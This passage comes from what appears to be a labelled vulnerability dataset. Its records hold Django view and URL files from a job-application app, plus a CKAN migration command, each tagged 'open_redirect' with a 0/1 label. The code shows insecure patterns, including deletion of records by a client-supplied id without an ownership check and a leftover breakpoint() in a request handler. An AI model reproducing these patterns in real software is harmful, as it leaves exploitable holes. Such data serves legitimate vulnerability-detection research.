change_positions_sort_method(request, sort_by):\n    if request.POST.get(\"sort-created\"):\n        return '-created'\n    elif request.POST.get(\"sort-closed\"):\n        return '-date_closed'\n    elif request.POST.get(\"sort-position\"):\n        return 'position_title'\n    return sort_by\n\n\n# View of all positions associated with a user account\n@login_required(login_url='/login/', redirect_field_name=None)\ndef positions(request):\n    # Order of positions display\n    sort_by = get_positions_sort_method(request)\n    if request.method == 'POST':\n        sort_by = change_positions_sort_method(request, sort_by)\n        # User wants to view position detail\n        if request.POST.get(\"position\"):\n            return position(request, Position.objects.get(\n                id=request.POST.get(\"id\")))\n        # User wants to delete position\n        elif request.POST.get(\"delete\"):\n            Position.objects.get(\n                id=request.POST.get(\"id\")).delete()\n    # Persists positions sorting\n    request.session['position_sort'] = sort_by\n    # Displays list of positions\n    return render(request, 'positions.html', {\n        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'positions': request.user.positions.all().order_by(sort_by), 'sort': request.session['position_sort']\n    })\n\n\n# Position detail view\n@login_required(login_url='/login/', redirect_field_name=None)\ndef position(request, position):\n    return render(request, 'position.html', {\n        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position\n    })\n\n\ndef import_applications(request):\n    if request.method == 'POST':\n        form = ImportApplicationsForm(request.POST, request.FILES)\n        if form.is_valid():\n            breakpoint()\n            parse_applications()\n            # Call application parser logic here##\n\n            return render(request, 'importapplications/applications.html', {\n                'form': form})\n\n    form = ImportApplicationsForm()\n    return render(request, 'importapplications/applications.html', {\n        'form': form})\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "fa57b716a2f936c6da66fdd5ba6c531303eba7e2", "code": "/screendoor/views.py/n/nfrom string import digits\nfrom django.http import HttpResponse\nfrom django.core.mail import send_mail\nfrom django.shortcuts import render, redirect\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth import login, logout\nfrom django.contrib.auth.decorators import login_required\n\nfrom .uservisibletext import InterfaceText, CreateAccountFormText, PositionText, PositionsViewText, LoginFormText\nfrom django.utils.translation import gettext as _\nfrom screendoor.redactor import parse_applications\nfrom .forms import ScreenDoorUserCreationForm, LoginForm, CreatePositionForm, ImportApplicationsForm\nfrom .models import EmailAuthenticateToken, Position\nfrom screendoor.parseposter import parse_upload\n\n\n# Each view is responsible for doing one of two things: returning an HttpResponse object containing the content for\n# the requested page, or raising an exception such as Http404.\n\n\n# @login_required\n# The login_required decorator redirects unauthenticated sessions to 'settings.LOGIN_URL'\n\n@login_required(login_url='login/', redirect_field_name=None)\ndef index(request):\n    return redirect('positions')\n    # Returns main page\n    return render(request, 'index.html',\n                  {'user': request.user, 'baseVisibleText': InterfaceText})\n\n\ndef register_form(request):\n    register_form = ScreenDoorUserCreationForm()\n    if request.method == 'POST':\n        # create a form instance and populate it with data from the request:\n        register_form = ScreenDoorUserCreationForm(request.POST)\n        # check whether form data is valid\n        if register_form.is_valid():\n            # Create user\n            user = create_account(request)\n            # Send confirmation e-mail\n            send_user_email(request, user)\n            # Redirects to...\n            return render(request, 'registration/register.html',\n                          {'register_form': register_form,\n                           'account_created': format(CreateAccountFormText.account_created % user)})\n            # Returns form page\n    return render(request, 'registration/register.html',\n                  {'register_form': register_form})\n\n\ndef create_account(request):\n    # Creates account and saves email, password, username to database\n    user = get_user_model().objects.create_user(\n        request.POST['email'].lower(), password=request.POST['password1'], email=request.POST['email'].lower())\n    # Extrapolate first and last name from e-mail account (experimental)\n    user.first_name = request.POST['email'].split('.')[0].title()\n    user.last_name = request.POST['email'].split(\n        '.')[1].split('@')[0].title().translate({ord(n): None for n in digits})\n    # Set user as inactive until e-mail confirmation\n    user.email_confirmed = False\n    # Save updated user info to database\n    user.save()\n    return user\n\n\ndef send_user_email(request, user):\n    url = generate_confirmation_url(request, user)\n    mail_sent = send_mail(\n        'ScreenDoor: Please confirm e-mail address',\n        'Please visit the following URL to confirm your account: ' + url,\n        'screendoor@screendoor.ca',\n        # Address: should be user.email\n        [user.email],\n        fail_silently=False,\n    )\n\n\ndef generate_confirmation_url(request, user):\n    token = EmailAuthenticateToken()\n    token.user = user\n    token.create_key()\n    token.save()\n    # TODO: generate first part of URL programmatically not as hardcoded string\n    return \"http://localhost:8000/confirm?key=\" + str(token.key)\n\n\ndef login_form(request):\n    # If user is not logged in, display login form\n    if not request.user.is_authenticated:\n        form = LoginForm()\n        # Has the user hit login button\n        if request.method == 'POST':\n            # Clears any GET data\n            request.GET._mutable = True\n            request.GET['key'] = None\n            request.GET._mutable = False\n            # Instantiate form object\n            form = LoginForm(request.POST)\n            # Validates form and persists username data\n            if form.is_valid():\n                user = form.get_user()\n                login(request, user)\n                return redirect('home')\n        if request.GET.get('key') is not None:\n            account_key = request.GET.get('key')\n            # Is the token valid in the database\n            if EmailAuthenticateToken.objects.filter(key=account_key).exists():\n                token = EmailAuthenticateToken.objects.get(key=account_key)\n                user = token.user\n                user.email_confirmed = True\n                user.save()\n                token.delete()\n                # Display account confirmation message\n                return render(request, 'registration/login.html',\n                              {'login_form': form,\n                               'account_confirmed': format(LoginFormText.account_confirmed % user.email)})\n            # Display validation error message\n            return render(request, 'registration/login.html',\n                          {'login_form': form, 'validation_error': LoginFormText.validation_error})\n        # Display login page\n        return render(request, 'registration/login.html',\n                      {'login_form': form})\n    # If the user is already logged in, redirect to home\n    return redirect('home')\n\n\n@login_required(login_url='/login/', redirect_field_name=None)\ndef logout_view(request):\n    logout(request)\n    return redirect('login')\n\n\n@login_required(login_url='/login/', redirect_field_name=None)\ndef import_position(request):\n    if request.method == 'POST':\n        # if request.POST.get(\"upload-position\"):\n        # valid form\n        create_position_form = CreatePositionForm(\n            request.POST, request.FILES)\n        if create_position_form.is_valid():\n            # don't commit partial positions with only pdf/url into db\n            position = create_position_form.save(commit=False)\n            d = parse_upload(position)\n            errors = d.get('errors')\n            if errors:\n                create_position_form.add_error('pdf', errors)\n            # second check\n            if create_position_form.is_valid():\n                position = d.get('position')\n                # Persist position ID in session for saving and editing\n                request.session['position_id'] = position.id\n                # Successful render of a position\n                return render(request, 'createposition/importposition.html',\n                              {'position': position, 'form': create_position_form,\n                               'baseVisibleText': InterfaceText,\n                               'userVisibleText': PositionText})\n\n            # Default view for a form with errors\n            return render(request, 'createposition/importposition.html',\n                          {'form': create_position_form,\n                           'baseVisibleText': InterfaceText,\n                           'userVisibleText': PositionText})\n        if request.POST.get(\"save-position\"):\n            position = Position.objects.get(id=request.session['position_id'])\n            request.user.positions.add(position)\n            return redirect('home')\n    # view for a GET request instead of a POST request\n    create_position_form = CreatePositionForm()\n    return render(request, 'createposition/importposition.html', {\n        'form': CreatePositionForm, 'baseVisibleText': InterfaceText\n    })\n\n\n@login_required(login_url='/login/', redirect_field_name=None)\ndef positions(request):\n    try:\n        sort_by = request.session['position_sort']\n    except KeyError:\n        sort_by = '-created'\n    if request.method == 'POST':\n        if request.POST.get(\"sort-created\"):\n            sort_by = '-created'\n        elif request.POST.get(\"sort-closed\"):\n            sort_by = '-date_closed'\n        elif request.POST.get(\"sort-position\"):\n            sort_by = 'position_title'\n        elif request.POST.get(\"position\"):\n            return position(request, Position.objects.get(\n                id=request.POST.get(\"id\")))\n        elif request.POST.get(\"delete\"):\n            Position.objects.get(\n                id=request.POST.get(\"id\")).delete()\n\n    request.session['position_sort'] = sort_by\n    return render(request, 'positions.html', {\n        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'positions': request.user.positions.all().order_by(sort_by), 'sort': request.session['position_sort']\n    })\n\n\n@login_required(login_url='/login/', redirect_field_name=None)\ndef position(request, position):\n    return render(request, 'position.html', {\n        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position\n    })\n\n\ndef import_applications(request):\n    if request.method == 'POST':\n        form = ImportApplicationsForm(request.POST, request.FILES)\n        if form.is_valid():\n            breakpoint()\n            parse_applications()\n            # Call application parser logic here##\n\n            return render(request, 'importapplications/applications.html', {\n                'form': form})\n\n    form = ImportApplicationsForm()\n    return render(request, 'importapplications/applications.html', {\n        'form': form})\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "36c8baffc532ac416c18e58e42421001bfcdb184", "code": "screendoor/urls.py/n/nfrom django.urls import path, include\n\nfrom . import views\n\n\n# Set application namespace\n# app_name = 'screendoor'\n\nurlpatterns = [\n    path('', views.index, name='home'),\n    path('register/', views.register_form, name='register'),\n    path('login/', views.login_form, name='login'),\n    path('logout/', views.logout_view, name='logout'),\n    path('confirm/', views.login_form, name='confirm_account'),\n    path('createnewposition/', views.import_position, name='importposition'),\n    path('positions/', views.positions, name='positions'),\n    path('position/', views.position_detail, name='position'),\n    path('importapplications/', views.import_applications,\n         name='importapplications'),\n]\n/n/n/nscreendoor/views.py/n/nfrom string import digits\nfrom django.core.mail import send_mail\nfrom django.shortcuts import render, redirect\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth import login, logout\nfrom django.contrib.auth.decorators import login_required\n\nfrom .uservisibletext import InterfaceText, CreateAccountFormText, PositionText, PositionsViewText, LoginFormText\nfrom .forms import ScreenDoorUserCreationForm, LoginForm, CreatePositionForm, ImportApplicationsForm, ImportApplicationsText\nfrom .models import EmailAuthenticateToken, Position, Applicant, Education, Classification\nfrom screendoor.parseposter import parse_upload\nfrom screendoor.redactor import parse_applications\n\n\n# Each view is responsible for doing one of two things: returning an HttpResponse object containing the content for\n# the requested page, or raising an exception such as Http404.\n# The @login_required decorator redirects unauthenticated sessions to 'settings.LOGIN_URL' or the specified URL\n\n\n# Index currently redirects to the positions view if logged in\n@login_required(login_url='login/', redirect_field_name=None)\ndef index(request):\n    return redirect('positions')\n    # Returns main page\n    return render(request, 'index.html',\n                  {'user': request.user, 'baseVisibleText': InterfaceText})\n\n\n# Renders account registration form\ndef register_form(request):\n    register_form = ScreenDoorUserCreationForm()\n    if request.method == 'POST':\n        # create a form instance and populate it with data from the request:\n        register_form = ScreenDoorUserCreationForm(request.POST)\n        # check whether form data is valid\n        if register_form.is_valid():\n            # Create user\n            user = create_account(request)\n            # Send confirmation e-mail\n            send_user_email(request, user)\n            # Redirects to...\n            return render(request, 'registration/register.html',\n                          {'register_form': register_form,\n                           'account_created': format(CreateAccountFormText.account_created % user)})\n    # Returns form page\n    return render(request, 'registration/register.html',\n                  {'register_form': register_form})\n\n\n# Creates and returns user object from request data\ndef create_account(request):\n    # Creates account and saves email, password, username to database\n    user = get_user_model().objects.create_user(\n        request.POST['email'].lower(), password=request.POST['password1'], email=request.POST['email'].lower())\n    # Extrapolate first and last name from e-mail account (experimental)\n    user.first_name = request.POST['email'].split('.')[0].title()\n    user.last_name = request.POST['email'].split(\n        '.')[1].split('@')[0].title().translate({ord(n): None for n in digits})\n    # Set user as inactive until e-mail confirmation\n    user.email_confirmed = False\n    # Save updated user info to database\n    user.save()\n    return user\n\n\n# Sends account confirmation e-mail to user\n# Currently sends mock e-mail via console\ndef send_user_email(request, user):\n    url = generate_confirmation_url(request, user)\n    send_mail(\n        'ScreenDoor: Please confirm e-mail address',\n        'Please visit the following URL to confirm your account: ' + url,\n        'screendoor@screendoor.ca',\n        # Address: should be user.email\n        [user.email],\n        fail_silently=False,\n    )\n\n\n# Creates and returns a working account confirmation URL\ndef generate_confirmation_url(request, user):\n    token = EmailAuthenticateToken()\n    token.user = user\n    token.create_key()\n    token.save()\n    # TODO: generate first part of URL programmatically not as hardcoded string\n    return \"http://localhost:8000/confirm?key=\" + str(token.key)\n\n\n# Clears any GET data, i.e. account confirmation token string from URL\ndef clear_get_data(request):\n    # Clears any GET data\n    request.GET._mutable = True\n    request.GET['key'] = None\n    request.GET._mutable = False\n\n\n# Returns true if user authentication token is valid and userhas been validated and saved\ndef authenticate_user(account_key):\n    # If authentication key is valid, activate user and delete authentication token\n    if EmailAuthenticateToken.objects.filter(key=account_key).exists():\n        token = EmailAuthenticateToken.objects.get(key=account_key)\n        user = token.user\n        user.email_confirmed = True\n        user.save()\n        token.delete()\n        return user\n    return None\n\n\n# Displays form for user login and calls validation methods\ndef login_form(request):\n    # If user is not logged in, display login form\n    if not request.user.is_authenticated:\n        form = LoginForm()\n        # Has the user hit login button\n        if request.method == 'POST':\n            clear_get_data(request)\n            # Instantiate form object\n            form = LoginForm(request.POST)\n            # Validates form and persists username data\n            if form.is_valid():\n                user = form.get_user()\n                # Logs in and redirects user\n                login(request, user)\n                return redirect('home')\n        if request.GET.get('key') is not None:\n            # Check if authentication key is valid\n            user = authenticate_user(request.GET.get('key'))\n            if (user is not None):\n                # Display account confirmation message\n                return render(request, 'registration/login.html',\n                              {'login_form': form,\n                               'account_confirmed': format(LoginFormText.account_confirmed % user.email)})\n            # Display validation error message\n            return render(request, 'registration/login.html',\n                          {'login_form': form, 'validation_error': LoginFormText.validation_error})\n        # Display login page\n        return render(request, 'registration/login.html',\n                      {'login_form': form})\n    # If the user is already logged in, redirect to home\n    return redirect('home')\n\n\n# Logs out user\n@login_required(login_url='/login/', redirect_field_name=None)\ndef logout_view(request):\n    logout(request)\n    return redirect('login')\n\n\n# Run parse upload script and return dictionary\ndef parse_position_return_dictionary(create_position_form):\n    # don't commit partial positions with only pdf/url into db\n    return parse_upload(create_position_form.save(commit=False))\n\n\n# Adds position to user data\ndef save_position_to_user(request):\n    request.user.positions.add(Position.objects.get(\n        id=request.session['position_id']))\n\n\ndef edit_position(request):\n    position = Position.objects.get(\n        id=request.session['position_id'])\n    position.position_title = request.POST.get(\"position-title\")\n    position.classification = request.POST.get(\"position-classification\")\n    position.reference_number = request.POST.get(\"position-reference\")\n    position.selection_process_number = request.POST.get(\"position-selection\")\n    position.date_closed = request.POST.get(\"position-date_closed\")\n    position.num_positions = request.POST.get(\"position-num-positions\")\n    position.salary_min = request.POST.get(\n        \"position-salary-range\").split(\"$\")[1].split(\"-\")[0]\n    position.salary_max = request.POST.get(\n        \"position-salary-range\").split(\"-\")[1].split(\"$\")[1]\n    position.open_to = request.POST.get(\"position-open-to\")\n    position.description = request.POST.get(\"position-description\")\n    counter = 1\n    for requirement in position.requirement:\n        requirement.description = request.POST.get(\n            \"position-requirement\" + counter).split(\":\")[1]\n    return position\n\n\n# Displays form allowing users to upload job posting PDF files and URLs\n@login_required(login_url='/login/', redirect_field_name=None)\ndef import_position(request):\n    if request.method == 'POST':\n        create_position_form = CreatePositionForm(\n            request.POST, request.FILES)\n        # Is the form data valid\n        if create_position_form.is_valid():\n            dictionary = parse_position_return_dictionary(create_position_form)\n            errors = dictionary.get('errors')\n            if errors:\n                create_position_form.add_error('pdf', errors)\n            # Is the parsed data valid (any errors added)\n            if create_position_form.is_valid():\n                position = dictionary.get('position')\n                # Persist position ID in session for saving and editing\n                request.session['position_id'] = position.id\n                # Successful render of a position\n                return render(request, 'createposition/importposition.html',\n                              {'position': position, 'form': create_position_form,\n                               'baseVisibleText': InterfaceText,\n                               'userVisibleText': PositionText})\n            # Display errors\n            return render(request, 'createposition/importposition.html',\n                          {'form': create_position_form,\n                           'baseVisibleText': InterfaceText,\n                           'userVisibleText': PositionText})\n        # User pressed save button on uploaded and parsed position\n        if request.POST.get(\"save-position\"):\n            edit_position(request)\n            save_position_to_user(request)\n            return redirect('home')\n    # Default view for GET request\n    create_position_form = CreatePositionForm()\n    return render(request, 'createposition/importposition.html', {\n        'form': CreatePositionForm, 'baseVisibleText': InterfaceText\n    })\n\n\n# Gets user's persisted positions sort method, or returns default\ndef get_positions_sort_method(request):\n    try:\n        return request.session['position_sort']\n    except KeyError:\n        return '-created'\n\n\n# Changes positions sort method\ndef change_positions_sort_method(request, sort_by):\n    if request.POST.get(\"sort-created\"):\n        return '-created'\n    elif request.POST.get(\"sort-closed\"):\n        return '-date_closed'\n    elif request.POST.get(\"sort-position\"):\n        return 'position_title'\n    return sort_by\n\n\n# Data and visible text to render with positions list view\ndef positions_list_data(request, sort_by):\n    return {\n        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'applicationsForm': ImportApplicationsForm, 'positions': request.user.positions.all().order_by(sort_by), 'sort': request.session['position_sort']\n    }\n\n\n# View of all positions associated with a user account\n@login_required(login_url='/login/', redirect_field_name=None)\ndef positions(request):\n    # Order of positions display\n    sort_by = get_positions_sort_method(request)\n    if request.method == 'POST':\n        sort_by = change_positions_sort_method(request, sort_by)\n        # User wants to view position detail\n        if request.POST.get(\"position\"):\n            return position_detail(request, Position.objects.get(\n                id=request.POST.get(\"id\")))\n        # User wants to delete position\n        elif request.POST.get(\"delete\"):\n            Position.objects.get(\n                id=request.POST.get(\"id\")).delete()\n        # User wants to upload applications for a position\n        elif request.POST.get(\"upload-applications\"):\n            upload_applications(request)\n            return position_detail(request, Position.objects.get(\n                id=request.POST.get(\"id\")))\n    # Persists positions sorting\n    request.session['position_sort'] = sort_by\n    # Displays list of positions\n    return render(request, 'positions.html', positions_list_data(request, sort_by))\n\n\n# Data and visible text to render with positions\ndef position_detail_data(request, position):\n    return {'baseVisibleText': InterfaceText, 'applicationsForm': ImportApplicationsForm, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position, 'applications': position.applications}\n\n\n# Position detail view\n@login_required(login_url='/login/', redirect_field_name=None)\ndef position_detail(request, position):\n    return render(request, 'position.html', position_detail_data(request, position))\n\n\ndef upload_applications(request):\n    position = Position.objects.get(\n        id=request.POST.get(\"id\"))\n    # form = ImportApplicationsForm(request.POST, request.FILES)\n    # applications = import_applications(request)\n    # position.applications.add(applications)\n    # position.save()\n\n\ndef import_applications(request):\n    if request.method == 'POST':\n        form = ImportApplicationsForm(request.POST, request.FILES)\n        if form.is_valid():\n            breakpoint()\n            parse_applications()\n            # Call application parser logic here##\n\n            return render(request, 'importapplications/applications.html', {\n                'form': form})\n\n    form = ImportApplicationsForm()\n    return render(request, 'importapplications/applications.html', {\n        'form': form})\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "36c8baffc532ac416c18e58e42421001bfcdb184", "code": "/screendoor/urls.py/n/nfrom django.urls import path, include\n\nfrom . import views\n\n\n# Set application namespace\n# app_name = 'screendoor'\n\nurlpatterns = [\n    path('', views.index, name='home'),\n    path('register/', views.register_form, name='register'),\n    path('login/', views.login_form, name='login'),\n    path('logout/', views.logout_view, name='logout'),\n    path('confirm/', views.login_form, name='confirm_account'),\n    path('createnewposition/', views.import_position, name='importposition'),\n    path('positions/', views.positions, name='positions'),\n    path('position/', views.position, name='position'),\n    path('importapplications/', views.import_applications,\n         name='importapplications'),\n]\n/n/n/n/screendoor/views.py/n/nfrom string import digits\nfrom django.core.mail import send_mail\nfrom django.shortcuts import render, redirect\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth import login, logout\nfrom django.contrib.auth.decorators import login_required\n\nfrom .uservisibletext import InterfaceText, CreateAccountFormText, PositionText, PositionsViewText, LoginFormText\nfrom .forms import ScreenDoorUserCreationForm, LoginForm, CreatePositionForm, ImportApplicationsForm, ImportApplicationsText\nfrom .models import EmailAuthenticateToken, Position\nfrom screendoor.parseposter import parse_upload\nfrom screendoor.redactor import parse_applications\n\n\n# Each view is responsible for doing one of two things: returning an HttpResponse object containing the content for\n# the requested page, or raising an exception such as Http404.\n# The @login_required decorator redirects unauthenticated sessions to 'settings.LOGIN_URL' or the specified URL\n\n\n# Index currently redirects to the positions view if logged in\n@login_required(login_url='login/', redirect_field_name=None)\ndef index(request):\n    return redirect('positions')\n    # Returns main page\n    return render(request, 'index.html',\n                  {'user': request.user, 'baseVisibleText': InterfaceText})\n\n\n# Renders account registration form\ndef register_form(request):\n    register_form = ScreenDoorUserCreationForm()\n    if request.method == 'POST':\n        # create a form instance and populate it with data from the request:\n        register_form = ScreenDoorUserCreationForm(request.POST)\n        # check whether form data is valid\n        if register_form.is_valid():\n            # Create user\n            user = create_account(request)\n            # Send confirmation e-mail\n            send_user_email(request, user)\n            # Redirects to...\n            return render(request, 'registration/register.html',\n                          {'register_form': register_form,\n                           'account_created': format(CreateAccountFormText.account_created % user)})\n    # Returns form page\n    return render(request, 'registration/register.html',\n                  {'register_form': register_form})\n\n\n# Creates and returns user object from request data\ndef create_account(request):\n    # Creates account and saves email, password, username to database\n    user = get_user_model().objects.create_user(\n        request.POST['email'].lower(), password=request.POST['password1'], email=request.POST['email'].lower())\n    # Extrapolate first and last name from e-mail account (experimental)\n    user.first_name = request.POST['email'].split('.')[0].title()\n    user.last_name = request.POST['email'].split(\n        '.')[1].split('@')[0].title().translate({ord(n): None for n in digits})\n    # Set user as inactive until e-mail confirmation\n    user.email_confirmed = False\n    # Save updated user info to database\n    user.save()\n    return user\n\n\n# Sends account confirmation e-mail to user\n# Currently sends mock e-mail via console\ndef send_user_email(request, user):\n    url = generate_confirmation_url(request, user)\n    send_mail(\n        'ScreenDoor: Please confirm e-mail address',\n        'Please visit the following URL to confirm your account: ' + url,\n        'screendoor@screendoor.ca',\n        # Address: should be user.email\n        [user.email],\n        fail_silently=False,\n    )\n\n\n# Creates and returns a working account confirmation URL\ndef generate_confirmation_url(request, user):\n    token = EmailAuthenticateToken()\n    token.user = user\n    token.create_key()\n    token.save()\n    # TODO: generate first part of URL programmatically not as hardcoded string\n    return \"http://localhost:8000/confirm?key=\" + str(token.key)\n\n\n# Clears any GET data, i.e. account confirmation token string from URL\ndef clear_get_data(request):\n    # Clears any GET data\n    request.GET._mutable = True\n    request.GET['key'] = None\n    request.GET._mutable = False\n\n\n# Returns true if user authentication token is valid and userhas been validated and saved\ndef authenticate_user(account_key):\n    # If authentication key is valid, activate user and delete authentication token\n    if EmailAuthenticateToken.objects.filter(key=account_key).exists():\n        token = EmailAuthenticateToken.objects.get(key=account_key)\n        user = token.user\n        user.email_confirmed = True\n        user.save()\n        token.delete()\n        return True\n    return False\n\n\n# Displays form for user login and calls validation methods\ndef login_form(request):\n    # If user is not logged in, display login form\n    if not request.user.is_authenticated:\n        form = LoginForm()\n        # Has the user hit login button\n        if request.method == 'POST':\n            clear_get_data(request)\n            # Instantiate form object\n            form = LoginForm(request.POST)\n            # Validates form and persists username data\n            if form.is_valid():\n                user = form.get_user()\n                # Logs in and redirects user\n                login(request, user)\n                return redirect('home')\n        if request.GET.get('key') is not None:\n            # Check if authentication key is valid\n            if (authenticate_user(request.GET.get('key'))):\n                # Display account confirmation message\n                return render(request, 'registration/login.html',\n                              {'login_form': form,\n                               'account_confirmed': format(LoginFormText.account_confirmed % user.email)})\n            # Display validation error message\n            return render(request, 'registration/login.html',\n                          {'login_form': form, 'validation_error': LoginFormText.validation_error})\n        # Display login page\n        return render(request, 'registration/login.html',\n                      {'login_form': form})\n    # If the user is already logged in, redirect to home\n    return redirect('home')\n\n\n# Logs out user\n@login_required(login_url='/login/', redirect_field_name=None)\ndef logout_view(request):\n    logout(request)\n    return redirect('login')\n\n\n# Run parse upload script and return dictionary\ndef parse_position_return_dictionary(create_position_form):\n    # don't commit partial positions with only pdf/url into db\n    return parse_upload(create_position_form.save(commit=False))\n\n\n# Adds position to user data\ndef save_position_to_user(request):\n    request.user.positions.add(Position.objects.get(\n        id=request.session['position_id']))\n\n\n# Displays form allowing users to upload job posting PDF files and URLs\n@login_required(login_url='/login/', redirect_field_name=None)\ndef import_position(request):\n    if request.method == 'POST':\n        create_position_form = CreatePositionForm(\n            request.POST, request.FILES)\n        # Is the form data valid\n        if create_position_form.is_valid():\n            dictionary = parse_position_return_dictionary(create_position_form)\n            errors = dictionary.get('errors')\n            if errors:\n                create_position_form.add_error('pdf', errors)\n            # Is the parsed data valid (any errors added)\n            if create_position_form.is_valid():\n                position = dictionary.get('position')\n                # Persist position ID in session for saving and editing\n                request.session['position_id'] = position.id\n                # Successful render of a position\n                return render(request, 'createposition/importposition.html',\n                              {'position': position, 'form': create_position_form,\n                               'baseVisibleText': InterfaceText,\n                               'userVisibleText': PositionText})\n            # Display errors\n            return render(request, 'createposition/importposition.html',\n                          {'form': create_position_form,\n                           'baseVisibleText': InterfaceText,\n                           'userVisibleText': PositionText})\n        # User pressed save button on uploaded and parsed position\n        if request.POST.get(\"save-position\"):\n            save_position_to_user(request)\n            return redirect('home')\n    # Default view for GET request\n    create_position_form = CreatePositionForm()\n    return render(request, 'createposition/importposition.html', {\n        'form': CreatePositionForm, 'baseVisibleText': InterfaceText\n    })\n\n\n# Gets user's persisted positions sort method, or returns default\ndef get_positions_sort_method(request):\n    try:\n        return request.session['position_sort']\n    except KeyError:\n        return '-created'\n\n\n# Changes positions sort method\ndef change_positions_sort_method(request, sort_by):\n    if request.POST.get(\"sort-created\"):\n        return '-created'\n    elif request.POST.get(\"sort-closed\"):\n        return '-date_closed'\n    elif request.POST.get(\"sort-position\"):\n        return 'position_title'\n    return sort_by\n\n\n# Data and visible text to render with positions list view\ndef positions_list_data(request, sort_by):\n    return {\n        'baseVisibleText': InterfaceText, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'applicationsForm': ImportApplicationsForm, 'positions': request.user.positions.all().order_by(sort_by), 'sort': request.session['position_sort']\n    }\n  \n  \n# View of all positions associated with a user account\n@login_required(login_url='/login/', redirect_field_name=None)\ndef positions(request):\n    # Order of positions display\n    sort_by = get_positions_sort_method(request)\n    if request.method == 'POST':\n        sort_by = change_positions_sort_method(request, sort_by)\n        # User wants to view position detail\n        if request.POST.get(\"position\"):\n            return position(request, Position.objects.get(\n                id=request.POST.get(\"id\")))\n        # User wants to delete position\n        elif request.POST.get(\"delete\"):\n            Position.objects.get(\n                id=request.POST.get(\"id\")).delete()\n        # User wants to upload applications for a position\n        elif request.POST.get(\"upload-applications\"):\n            upload_applications(request)\n            return position(request, Position.objects.get(\n                id=request.POST.get(\"id\")))\n    # Persists positions sorting\n    request.session['position_sort'] = sort_by\n    # Displays list of positions\n    return render(request, 'positions.html', positions_list_data(request, sort_by))\n\n\n# Data and visible text to render with positions\ndef position_detail_data(request, position):\n    return {'baseVisibleText': InterfaceText, 'applicationsForm': ImportApplicationsForm, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position}\n\n\n# Position detail view\n@login_required(login_url='/login/', redirect_field_name=None)\ndef position(request, position):\n    return render(request, 'position.html', position_detail_data(request, position))\n\n\ndef upload_applications(request):\n    position = Position.objects.get(\n        id=request.POST.get(\"id\"))\n    # form = ImportApplicationsForm(request.POST, request.FILES)\n    # applications = import_applications(request)\n    # position.applications.add(applications)\n    # position.save()\n\n\ndef import_applications(request):\n    if request.method == 'POST':\n        form = ImportApplicationsForm(request.POST, request.FILES)\n        if form.is_valid():\n            breakpoint()\n            parse_applications()\n            # Call application parser logic here##\n\n            return render(request, 'importapplications/applications.html', {\n                'form': form})\n\n    form = ImportApplicationsForm()\n    return render(request, 'importapplications/applications.html', {\n        'form': form})\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "84cadcdc2efe01e2ced1b3901ebbdbba6de5e592", "code": "ckanext/data_qld/commands.py/n/nimport ckan.model as model\nimport ckan.plugins.toolkit as toolkit\nimport sqlalchemy\nfrom ckan.lib.cli import CkanCommand\nfrom ckan.model.package import Package\nfrom ckanapi import LocalCKAN\nimport ckan.logic as logic\nValidationError = logic.ValidationError\n\n_and_ = sqlalchemy.and_\n\n\nclass MigrateExtras(CkanCommand):\n    \"\"\"Migrates legacy field values that were added as free extras to datasets to their schema counterparts.\n    \"\"\"\n\n    summary = __doc__.split('\\n')[0]\n\n    def __init__(self, name):\n\n        super(MigrateExtras, self).__init__(name)\n\n    def get_package_ids(self):\n        session = model.Session\n        package_ids = []\n\n        packages = (\n            session.query(\n                Package\n            )\n        )\n\n        for pkg in packages:\n            package_ids.append(pkg.id)\n\n        return package_ids\n\n    def update_package(self, package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources):\n        # https://github.com/ckan/ckanext-scheming/issues/158\n        destination = LocalCKAN()\n        destination.action.package_patch(id=package_id,\n                                         security_classification=security_classification,\n                                         data_driven_application=data_driven_application,\n                                         version=version,\n                                         author_email=author_email,\n                                         notes=notes,\n                                         update_frequency=update_frequency,\n                                         resources=resources)\n\n    def command(self):\n        \"\"\"\n\n        :return:\n        \"\"\"\n        self._load_config()\n\n        context = {'session': model.Session}\n\n        # Step 1: Get all the package IDs.\n        package_ids = self.get_package_ids()\n\n        for package_id in package_ids:\n            # Set some defaults\n            default_security_classification = \"PUBLIC\"\n            default_data_driven_application = \"NO\"\n            default_version = \"1.0\"\n            default_author_email = \"opendata@qld.gov.au\"\n            default_update_frequency = \"annually\"\n            default_size = '1'  # 1 Byte\n            resources = []\n\n            pkg = toolkit.get_action('package_show')(context, {\n                'id': package_id\n            })\n\n            if pkg['resources']:\n                size = default_size\n\n                for resource in pkg['resources']:\n                    if 'size' in resource:\n                        size = resource['size'] if resource['size'] is not None and resource[\n                            'size'] != '0 bytes' else default_size\n\n                    if 'name' in resource:\n                        name = resource['name']\n\n                    if 'description' in resource:\n                        description = resource['description'] or name\n\n                    update_resource = {\n                        \"id\": resource['id'],\n                        \"size\": size,\n                        \"name\": name,\n                        \"description\": description,\n                        \"url\": resource['url']\n                    }\n                    resources.append(update_resource)\n\n            # Go through the packages and check for presence of 'Security classification'\n            # and 'Used in data-driven application' extras\n            security_classification = default_security_classification\n            data_driven_application = default_data_driven_application\n            version = default_version\n            author_email = default_author_email\n            update_frequency = default_update_frequency\n\n            if pkg.get('extras', None):\n\n                for extra in pkg['extras']:\n                    if extra['key'] == 'Security classification':\n                        security_classification = extra['value'] or default_security_classification\n                    elif extra['key'] in ['Used in data-driven application']:\n                        data_driven_application = extra['value'] or default_data_driven_application\n\n            if 'version' in pkg:\n                version = pkg['version'] or default_version\n\n            if 'author_email' in pkg:\n                author_email = pkg['author_email'] or default_author_email\n\n            if 'notes' in 